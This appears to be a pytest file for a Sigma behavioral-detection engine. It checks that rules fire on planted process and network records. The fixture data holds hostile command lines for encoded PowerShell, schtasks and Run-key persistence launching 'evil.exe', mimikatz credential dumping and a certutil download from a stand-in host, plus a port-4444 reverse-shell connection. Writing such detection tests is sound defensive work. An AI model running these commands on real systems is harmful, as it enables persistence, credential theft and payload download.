from server.engine.sigma_runner import load_rules, run as sigma_run, compile_rule
import yaml

import os

RULES_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "rules", "behavioral"
)


def _mk_host(conn):
    cur = conn.execute(
        "INSERT INTO hosts (client_id, hostname, os_type, api_key_hash, enrolled_at_utc) VALUES (?,?,?,?,?)",
        ("c1", "sigma-test", "windows", "x", "2026-01-01T00:00:00+00:00"),
    )
    return cur.lastrowid


def test_all_rules_validate_and_compile():
    rules, errors = load_rules(RULES_DIR)
    assert errors == [], f"rule errors: {errors}"
    assert len(rules) >= 8


def test_sigma_fires_on_planted_process(tmp_db):
    from server import db as database
    conn = database.connect()
    host_id = _mk_host(conn)
    rows = [
        (1, "2026-08-20T10:00:00+00:00", 100, 4, "powershell.exe",
         r"powershell.exe -nop -w hidden -enc SQBFAFgA", r"C:\Windows\System32\powershell.exe", None),
        (2, "2026-08-20T10:01:00+00:00", 101, 4, "notepad.exe",
         "notepad.exe", r"C:\Windows\System32\notepad.exe", None),
        (3, "2026-08-20T10:02:00+00:00", 102, 100, "schtasks.exe",
         r"schtasks.exe /create /tn Updater /tr C:\Temp\evil.exe /sc daily",
         r"C:\Windows\System32\schtasks.exe", None),
        (4, "2026-08-20T10:03:00+00:00", 103, 100, "reg.exe",
         r"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe",
         r"C:\Windows\System32\reg.exe", None),
        (5, "2026-08-20T10:04:00+00:00", 104, 100, "mimikatz.exe",
         "mimikatz.exe sekurlsa::logonpasswords", r"C:\Temp\mimikatz_x64.exe", None),
        (6, "2026-08-20T10:05:00+00:00", 105, 100, "whoami.exe",
         "whoami.exe /priv", r"C:\Windows\System32\whoami.exe", None),
        (7, "2026-08-20T10:06:00+00:00", 106, 100, "certutil.exe",
         "certutil.exe -urlcache -split -f http://x/e.exe e.exe",
         r"C:\Windows\System32\certutil.exe", None),
    ]
    for cid, ts, pid, ppid, name, cmdline, exe, sha in rows:
        conn.execute(
            """INSERT INTO raw_processes (host_id, collection_id, collected_at_utc, pid, ppid,
               name, cmdline, exe_path, sha256) VALUES (?,?,?,?,?,?,?,?,?)""",
            (host_id, f"c-{cid}", ts, pid, ppid, name, cmdline, exe, sha),
        )
    conn.commit()

    fired, errors = sigma_run(conn)
    assert errors == [], errors
    titles = {f["rule_name"] for f in fired}
    assert any("Encoded Command" in t for t in titles), titles
    assert any("Scheduled Task Creation" in t for t in titles), titles
    assert any("Run Key Persistence" in t for t in titles), titles
    assert any("Mimikatz" in t for t in titles), titles
    assert any("Whoami" in t for t in titles), titles
    assert any("Certutil" in t for t in titles), titles

    benign = [f for f in fired if "notepad" in str(f["summary"]).lower()]
    assert benign == []


def test_sigma_network_rule(tmp_db):
    from server import db as database
    conn = database.connect()
    host_id = _mk_host(conn)
    conn.execute(
        """INSERT INTO raw_connections (host_id, collection_id, collected_at_utc, pid,
           process_name, local_ip, local_port, remote_ip, remote_port, proto, status)
           VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
        (host_id, "n1", "2026-08-20T11:00:00+00:00", 500, "powershell.exe",
         "10.0.0.5", 51000, "203.0.113.9", 4444, "tcp", "established"),
    )
    conn.commit()
    fired, errors = sigma_run(conn)
    assert errors == []
    assert any("Reverse Shell" in f["rule_name"] for f in fired)


def test_condition_all_of(tmp_db):
    doc = yaml.safe_load(open(os.path.join(RULES_DIR, "reg_run_persistence.yml"), encoding="utf-8"))
    compiled = compile_rule(doc)
    assert compiled is not None and compiled["technique_id"] == "T1547.001"


def test_since_watermark_filters(tmp_db):
    from server import db as database
    conn = database.connect()
    host_id = _mk_host(conn)
    conn.execute(
        """INSERT INTO raw_processes (host_id, collection_id, collected_at_utc, pid, ppid,
           name, cmdline, exe_path) VALUES (?,?,?,?,?,?,?,?)""",
        (host_id, "w1", "2020-01-01T00:00:00+00:00", 1, 0, "powershell.exe",
         "powershell.exe -enc AAAA", r"C:\Windows\System32\powershell.exe"),
    )
    conn.commit()
    fired_new, _ = sigma_run(conn, since_utc="2025-01-01T00:00:00+00:00")
    assert fired_new == []
    fired_old, _ = sigma_run(conn, since_utc="2019-01-01T00:00:00+00:00")
    assert len(fired_old) >= 1

